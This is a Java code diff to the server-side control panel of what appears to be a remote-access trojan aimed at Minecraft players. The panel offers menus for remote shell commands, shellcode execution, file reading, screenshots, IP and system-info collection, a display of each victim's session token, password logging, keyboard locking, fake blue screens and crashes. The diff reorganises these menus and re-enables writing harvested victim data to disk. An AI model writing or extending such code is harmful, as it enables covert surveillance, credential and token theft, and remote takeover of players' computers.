@@ -103,52 +103,55 @@ public class Server extends TcpServer {
                     });
 
                     JMenuItem config = new JMenuItem("Config");
-                    config.addActionListener(e -> new JDialog(gui, true) {{
-                        ClientConfigData cfg = Utils.getDefaultClientConfig();
-                        JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
-                        JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
-                        JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
-                        JTextField filterPattern = new JTextField(cfg.filterPattern);
-                        JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
-                        JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
-                        JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
-                        JTextField serverName = new JTextField(cfg.name);
-                        JTextArea invisiblePlayers = new JTextArea();
-                        cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
-                        JButton send = new JButton("Send");
-                        send.addActionListener(e1 -> {
-                            cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
-                            cfg.isMuted = isMuted.isSelected();
-                            cfg.isBeingFiltered = isBeingFiltered.isSelected();
-                            cfg.filterPattern = filterPattern.getText();
-                            cfg.logChatAndCommand = logChatAndCommand.isSelected();
-                            cfg.canJoinServer = canJoinServer.isSelected();
-                            cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
-                            cfg.name = serverName.getText();
-                            cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
-                            send(cfg);
-                            dispose();
-                        });
+                    config.addActionListener(e -> getConnStream().forEach(conn -> {
+                        ClientConfigData cfg = clientMap.get(conn).configData;
+                        new JDialog(gui, true) {{
+                            JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
+                            JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
+                            JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
+                            JTextField filterPattern = new JTextField(cfg.filterPattern);
+                            JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
+                            JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
+                            JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
+                            JTextField serverName = new JTextField(cfg.name);
+                            JTextArea invisiblePlayers = new JTextArea();
+                            cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
+                            JButton send = new JButton("Send");
+                            send.addActionListener(e1 -> {
+                                cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
+                                cfg.isMuted = isMuted.isSelected();
+                                cfg.isBeingFiltered = isBeingFiltered.isSelected();
+                                cfg.filterPattern = filterPattern.getText();
+                                cfg.logChatAndCommand = logChatAndCommand.isSelected();
+                                cfg.canJoinServer = canJoinServer.isSelected();
+                                cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
+                                cfg.name = serverName.getText();
+                                cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
+                                send(cfg);
+                                clientMap.get(conn).configData = cfg;
+                                dispose();
+                            });
 
-                        setLayout(new MigLayout());
-                        add(passwordBeingLogged, "wrap");
-                        add(isMuted, "wrap");
-                        add(isBeingFiltered, "wrap");
-                        add(new JLabel("Filter pattern"), "split 2");
-                        add(filterPattern, "wrap, growx");
-                        add(logChatAndCommand, "wrap");
-                        add(canJoinServer, "wrap");
-                        add(canQuitServerOrCloseWindow, "wrap");
-                        add(new JLabel("Server name"), "split 2");
-                        add(serverName, "wrap, growx");
-                        add(new JLabel("Invisible players"), "split 2");
-                        add(invisiblePlayers, "wrap, growx");
-                        add(send);
-                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
-                        pack();
-                        setLocationRelativeTo(null);
-                        setVisible(true);
-                    }});
+                            setLayout(new MigLayout());
+                            add(passwordBeingLogged, "wrap");
+                            add(isMuted, "wrap");
+                            add(isBeingFiltered, "wrap");
+                            add(new JLabel("Filter pattern"), "split 2");
+                            add(filterPattern, "wrap, growx");
+                            add(logChatAndCommand, "wrap");
+                            add(canJoinServer, "wrap");
+                            add(canQuitServerOrCloseWindow, "wrap");
+                            add(new JLabel("Server name"), "split 2");
+                            add(serverName, "wrap, growx");
+                            add(new JLabel("Invisible players"), "split 2");
+                            add(invisiblePlayers, "wrap, growx");
+                            add(send);
+                            setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+                            pack();
+                            setLocationRelativeTo(null);
+                            setVisible(true);
+                        }};
+                    }));
 
                     JMenuItem follow = new JMenuItem("Follow");
                     follow.addActionListener(e -> new JDialog(gui, true) {{
@@ -202,41 +205,82 @@ public class Server extends TcpServer {
 
                     JMenuItem chat = new JMenuItem("Chat");
                     chat.addActionListener(e -> getConnStream().forEach(connection -> chatWindows.add(new ServerChatWindow(connection) {{
-                        setTitle(String.format("Chat with %s(%d)", clientMap.get(connection).player.playerName, clientMap.get(connection).id));
+                        setTitle(String.format("Chat with %s(%d)", clientMap.get(connection).player.playerName(), clientMap.get(connection).id));
                     }})));
 
-                    add(disconnect);
-                    add(reconnect);
-                    add(execute);
-                    add(config);
-                    add(follow);
-                    add(spam);
-                    add(chat);
+                    add(new JMenu("Client") {{
+                        add(disconnect);
+                        add(reconnect);
+                        add(config);
+                        add(getStringsMenu("Get Client Config", "config"));
+                        add(getStringsMenu("Update Player Info", "player"));
+                        add(new JMenuItem("Player Info") {{
+                            addActionListener(e -> getConnStream().forEach(conn -> new JDialog() {{
+                                PlayerData data = clientMap.get(conn).player;
 
-                    add(getBoolMenu("Lag", "lagger"));
-                    add(getBoolMenu("BSOD", "bsod"));
-                    add(getBoolMenu("KeyLocker", "keylocker"));
-                    add(getBoolMenu("Lick", "lick"));
+                                setLayout(new MigLayout());
+                                class NoEditTxt extends JTextField {
+                                    public NoEditTxt(String txt) {
+                                        super(txt);
+                                        setEditable(false);
+                                    }
+                                }
+                                add(new NoEditTxt("Player Name: " + data.playerName()), "wrap");
+                                add(new NoEditTxt("UUID: " + data.uuid()), "wrap");
+                                add(new NoEditTxt("Server: " + data.server()), "wrap");
+                                add(new NoEditTxt("Token: " + data.token()), "wrap");
+                                add(new JCheckBox("OP", data.isOp()), "wrap");
+                                add(new JCheckBox("In game", data.inGame()), "wrap");
+                                add(new JCheckBox("Windows", data.isWin()), "wrap");
+                                add(new NoEditTxt("X: " + data.x()), "wrap");
+                                add(new NoEditTxt("Y: " + data.y()), "wrap");
+                                add(new NoEditTxt("Z: " + data.z()), "wrap");
+                                setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+                                pack();
+                                setLocationRelativeTo(null);
+                                setVisible(true);
+                            }}));
+                        }});
+                        add(getStringsMenu("Crash Minecraft", "crash"));
+                    }});
 
-                    add(getStringsMenu("Mods", "mods"));
-                    add(getStringsMenu("System Info", "systeminfo"));
-                    add(getStringsMenu("Screenshot", "screenshot"));
-                    add(getStringsMenu("Desktop Screenshot", "screenshot2"));
-                    add(getStringsMenu("Client Config", "config"));
-                    add(getStringsMenu("Player info", "player"));
-                    add(getStringsMenu("Player Skin", "skin"));
-                    add(getStringsMenu("Kick", "kick"));
-                    add(getStringsMenu("Run arguments", "runargs"));
-                    add(getStringsMenu("JVM props", "props"));
-                    add(getStringsMenu("IP address", "ip"));
-                    add(getStringsMenu("Crash", "crash"));
-                    add(getStringsMenu("OP Everyone", "op@a"));
+                    add(new JMenu("System") {{
+                        add(getStringsMenu("System Info", "systeminfo"));
+                        add(getStringsMenu("Shellcode", "shellcode", "Shellcode"));
+                        add(getStringsMenu("Shell Command", "shell", "Command"));
+                        add(execute);
+                        add(getStringsMenu("Run Arguments", "runargs"));
+                        add(getStringsMenu("JVM Props", "props"));
+                        add(getBoolMenu("KeyLocker", "keylocker"));
+                    }});
 
-                    add(getStringsMenu("Join Server", "join_server", "IP"));
-                    add(getStringsMenu("Shell command", "shell", "Command"));
-                    add(getStringsMenu("Shellcode", "shellcode", "Shellcode"));
-                    add(getStringsMenu("Read file", "read", "File path"));
-                    add(getStringsMenu("Open URL", "open_url", "Link"));
+                    add(new JMenu("Files") {{
+                        add(getStringsMenu("Read file", "read", "File path"));
+                    }});
+
+                    add(new JMenu("Info") {{
+                        add(getStringsMenu("Screenshot", "screenshot"));
+                        add(getStringsMenu("Desktop Screenshot", "screenshot2"));
+                        add(getStringsMenu("Player Skin", "skin"));
+                        add(getStringsMenu("Mods", "mods"));
+                        add(getStringsMenu("IP address", "ip"));
+                    }});
+
+                    add(new JMenu("Player") {{
+                        add(follow);
+                        add(spam);
+                        add(getBoolMenu("Lick", "lick"));
+                        add(getStringsMenu("Join Server", "join_server", "IP"));
+                        add(getStringsMenu("Kick", "kick"));
+                        add(getStringsMenu("OP Everyone", "op@a"));
+                    }});
+
+                    add(new JMenu("Misc") {{
+                        add(chat);
+                        add(getBoolMenu("Fake BSOD", "bsod"));
+                        add(getBoolMenu("Lag", "lagger"));
+                        add(getStringsMenu("Open URL", "open_url", "Link"));
+                    }});
                 }}
         );
 
@@ -257,7 +301,9 @@ public class Server extends TcpServer {
     public void onOpen(Connection conn) {
         String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
         log("Client connected: %s ID: %d", address, clientIndex);
-        clientMap.put(conn, new Info(clientIndex));
+        Info i = new Info(clientIndex);
+        i.configData = clientDefaultConf;
+        clientMap.put(conn, i);
         ((DefaultTableModel) adminPanel.table.getModel()).addRow(new Object[]{clientIndex, null, null});
         clientIndex++;
     }
@@ -284,12 +330,18 @@ public class Server extends TcpServer {
                         FileUtil.write(file, data.bytes());
                     }
                     case "skin" -> {
-                        String playerName = info.player.playerName;
+                        String playerName = info.player.playerName();
                         File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                         FileUtil.write(file, data.bytes());
                     }
                 }
             } else if (message.data instanceof StringsData data) {
+                switch (data.id()) {
+                    case "mods", "runargs" -> {
+                        File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName(), true));
+                        FileUtil.write(file, data.toString());
+                    }
+                }
                 if (data.data().size() == 0 && data.id().equals("getconfig")) {
                     conn.send(new Message(clientDefaultConf));
                 } else if (data.data().size() == 1) {
@@ -297,19 +349,20 @@ public class Server extends TcpServer {
                     switch (data.id()) {
                         case "chat" ->
                                 chatWindows.stream().filter(wnd -> wnd.connection == conn).forEach(wnd -> wnd.receivedText.append("Target: " + msg));
-                        //case "logging" -> {
-                        //    File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
-                        //    String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
-                        //    FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
-                        //}
+                        case "logging" -> {
+                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
+                            String oldInfo = new String(FileUtil.read(file));
+                            FileUtil.write(file, (oldInfo + msg).getBytes());
+                        }
                         case "ip" -> {
                             info.ip = msg;
                             changeRow(info, false);
                         }
-                        //case "runargs", "systeminfo", "props" -> {
-                        //    File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
-                        //    FileUtil.write(file, msg);
-                        //}
+                        case "mods", "runargs", "systeminfo", "props" -> {
+                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName(), true));
+                            FileUtil.write(file, msg);
+                        }
+                        default -> log("Received message: %s From ID %d", message.toString(), id);
                     }
                 }
             } else if (message.data instanceof PlayerData data) {
@@ -319,7 +372,6 @@ public class Server extends TcpServer {
         } catch (Exception e) {
             e.printStackTrace();
         }
-        log("Received message: %s From ID %d", message.toString(), id);
     }
 
     private void log(String str, Object... format) {
@@ -337,7 +389,7 @@ public class Server extends TcpServer {
                 }
 
                 connTableModel.setValueAt(info.ip, i, 1);
-                connTableModel.setValueAt(info.player != null ? info.player.playerName : "", i, 2);
+                connTableModel.setValueAt(info.player != null ? info.player.playerName() : "", i, 2);
                 return;
             }
         }
@@ -367,6 +419,7 @@ public class Server extends TcpServer {
             setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
             pack();
             setLocationRelativeTo(null);
+            setResizable(false);
             setVisible(true);
         }});
         return menuItem;
